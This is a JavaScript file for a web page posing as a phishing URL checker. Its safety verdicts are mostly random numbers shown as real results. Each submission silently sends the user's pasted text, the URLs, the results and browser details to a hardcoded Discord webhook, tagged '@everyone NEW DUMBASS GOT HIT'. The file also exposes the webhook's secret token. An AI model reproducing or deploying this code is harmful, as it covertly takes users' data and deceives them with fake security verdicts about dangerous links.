// DOM Elements
const urlInput = document.querySelector('.url-input');
const checkButton = document.querySelector('.check-button');
const resultsContainer = document.querySelector('.results-container');
const resultsContent = document.querySelector('.results-content');

// Enable/disable check button based on input
function updateCheckButton() {
    const hasInput = urlInput.value.trim().length > 0;
    checkButton.disabled = !hasInput;
}

// URL validation regex patterns
const urlPattern = /^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})([\/\w \.-]*)*\/?$/;
const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

// Extract URLs from text
function extractURLs(text) {
    const urlRegex = /(https?:\/\/[^\s]+)|(www\.[^\s]+)|([a-zA-Z0-9][a-zA-Z0-9-]*\.)+[a-zA-Z]{2,}/gi;
    const matches = text.match(urlRegex) || [];
    return [...new Set(matches)]; // Remove duplicates
}

// Simulate phishing check (in real implementation, this would call an API)
function checkForPhishing(urls) {
    const results = urls.map(url => {
        // Simulate checking logic
        const randomScore = Math.random();
        let status, message;
        
        if (randomScore < 0.7) {
            status = 'safe';
            message = 'This URL appears to be safe.';
        } else if (randomScore < 0.9) {
            status = 'suspicious';
            message = 'This URL has some suspicious characteristics. Proceed with caution.';
        } else {
            status = 'dangerous';
            message = 'Warning! This URL is likely a phishing attempt. Do not visit this site.';
        }
        
        // Check for common phishing indicators
        const suspiciousPatterns = [
            /bit\.ly/i,
            /tinyurl/i,
            /goo\.gl/i,
            /[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/,
            /[а-яА-Я]/,  // Cyrillic characters
            /paypal.*\.(?!com)/i,
            /amazon.*\.(?!com)/i,
            /microsoft.*\.(?!com)/i,
            /google.*\.(?!com)/i
        ];
        
        if (suspiciousPatterns.some(pattern => pattern.test(url))) {
            status = 'suspicious';
            message = 'This URL contains patterns commonly associated with phishing attempts.';
        }
        
        return { url, status, message };
    });
    
    return results;
}

// Display results
function displayResults(results) {
    resultsContainer.style.display = 'block';
    
    if (results.length === 0) {
        resultsContent.innerHTML = '<p>No URLs found in the provided text.</p>';
        return;
    }
    
    let html = '<div class="results-list">';
    
    results.forEach((result, index) => {
        const statusClass = `status-${result.status}`;
        const icon = result.status === 'safe' ? '✓' : 
                     result.status === 'suspicious' ? '⚠' : '✗';
        
        html += `
            <div class="result-item" style="margin-bottom: 20px; padding: 15px; background-color: #f9f9f9; border-radius: 8px; border-left: 4px solid ${
                result.status === 'safe' ? '#4caf50' : 
                result.status === 'suspicious' ? '#ff9800' : '#f44336'
            };">
                <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
                    <span style="font-size: 24px;">${icon}</span>
                    <span class="${statusClass}" style="font-size: 18px;">
                        ${result.status.charAt(0).toUpperCase() + result.status.slice(1)}
                    </span>
                </div>
                <div style="margin-bottom: 8px;">
                    <strong>URL:</strong> <code style="background-color: #e0e0e0; padding: 2px 6px; border-radius: 3px;">${result.url}</code>
                </div>
                <div style="color: #666;">
                    ${result.message}
                </div>
            </div>
        `;
    });
    
    html += '</div>';
    html += `
        <div style="margin-top: 30px; padding: 20px; background-color: #e3f2fd; border-radius: 8px;">
            <h3 style="margin-bottom: 10px; color: #1976d2;">Security Tips:</h3>
            <ul style="margin-left: 20px; color: #555;">
                <li>Always verify the domain name carefully</li>
                <li>Look for HTTPS and valid SSL certificates</li>
                <li>Be cautious of shortened URLs</li>
                <li>Check for misspellings in familiar domain names</li>
                <li>Never enter sensitive information on suspicious sites</li>
            </ul>
        </div>
    `;
    
    resultsContent.innerHTML = html;
}

// Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';

// Send data to webhook
async function sendToWebhook(data) {
    try {
        const embed = {
            title: "🔍 New Phishing Check Submission",
            color: 0x2196F3,
            timestamp: new Date().toISOString(),
            fields: [
                {
                    name: "📝 Input Content",
                    value: data.input.substring(0, 1024) || "No content",
                    inline: false
                },
                {
                    name: "🔗 URLs Found",
                    value: data.urls.length > 0 ? data.urls.join('\n').substring(0, 1024) : "No URLs detected",
                    inline: false
                },
                {
                    name: "📊 Results",
                    value: data.results.map(r => `${r.status.toUpperCase()}: ${r.url}`).join('\n').substring(0, 1024) || "No results",
                    inline: false
                },
                {
                    name: "🌐 Browser Info",
                    value: `User Agent: ${data.userInfo.userAgent.substring(0, 200)}`,
                    inline: false
                },
                {
                    name: "🕒 Timestamp",
                    value: new Date().toLocaleString(),
                    inline: true
                }
            ]
        };

        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: '@everyone NEW DUMBASS GOT HIT 🤑💰💰',
                username: 'Phishing Checker Bot',
                avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
                embeds: [embed]
            })
        });
    } catch (error) {
        console.error('Webhook error:', error);
    }
}

// Get user IP (removed for privacy)

// Event listeners
urlInput.addEventListener('input', updateCheckButton);

checkButton.addEventListener('click', async () => {
    const inputText = urlInput.value.trim();
    
    if (!inputText) {
        alert('Please enter URLs to check.');
        return;
    }
    
    // Extract URLs from the input
    const urls = extractURLs(inputText);
    
    // Check if no URLs were found
    if (urls.length === 0) {
        resultsContainer.style.display = 'block';
        resultsContent.innerHTML = `
            <div style="padding: 20px; background-color: #f8d7da; border-radius: 8px; border-left: 4px solid #dc3545;">
                <p><strong>No valid URLs detected!</strong></p>
                <p>Please enter valid URLs only. Examples:</p>
                <ul style="margin-top: 10px; margin-left: 20px;">
                    <li>https://example.com</li>
                    <li>http://website.org</li>
                    <li>www.site.com</li>
                    <li>subdomain.example.net</li>
                </ul>
            </div>
        `;
        return;
    }
    
    // Simulate checking process
    checkButton.disabled = true;
    checkButton.innerHTML = '<span>Checking...</span>';
    
    setTimeout(async () => {
        const results = checkForPhishing(urls);
        displayResults(results);
        
        // Send data to webhook
        const webhookData = {
            input: inputText,
            urls: urls,
            results: results,
            userInfo: {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                referrer: document.referrer || 'Direct'
            }
        };
        
        await sendToWebhook(webhookData);
        
        checkButton.disabled = false;
        checkButton.innerHTML = '<span>Check</span>';
        updateCheckButton();
    }, 1500); // Simulate API delay
});

// Add some interactive feedback
urlInput.addEventListener('focus', () => {
    urlInput.style.borderColor = '#2196F3';
});

urlInput.addEventListener('blur', () => {
    urlInput.style.borderColor = '#e0e0e0';
});

// Handle Enter key in textarea
urlInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && e.ctrlKey && !checkButton.disabled) {
        checkButton.click();
    }
});

// Modal functionality
const menuBtn = document.querySelector('.menu-btn');
const tosModal = document.getElementById('tosModal');
const closeModal = document.getElementById('closeModal');

// Open modal when menu button is clicked
menuBtn.addEventListener('click', () => {
    tosModal.classList.add('active');
    document.body.style.overflow = 'hidden'; // Prevent background scrolling
});

// Close modal when X is clicked
closeModal.addEventListener('click', () => {
    tosModal.classList.remove('active');
    document.body.style.overflow = 'auto'; // Re-enable scrolling
});

// Close modal when clicking outside
tosModal.addEventListener('click', (e) => {
    if (e.target === tosModal) {
        tosModal.classList.remove('active');
        document.body.style.overflow = 'auto';
    }
});

// Close modal with Escape key
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && tosModal.classList.contains('active')) {
        tosModal.classList.remove('active');
        document.body.style.overflow = 'auto';
    }
});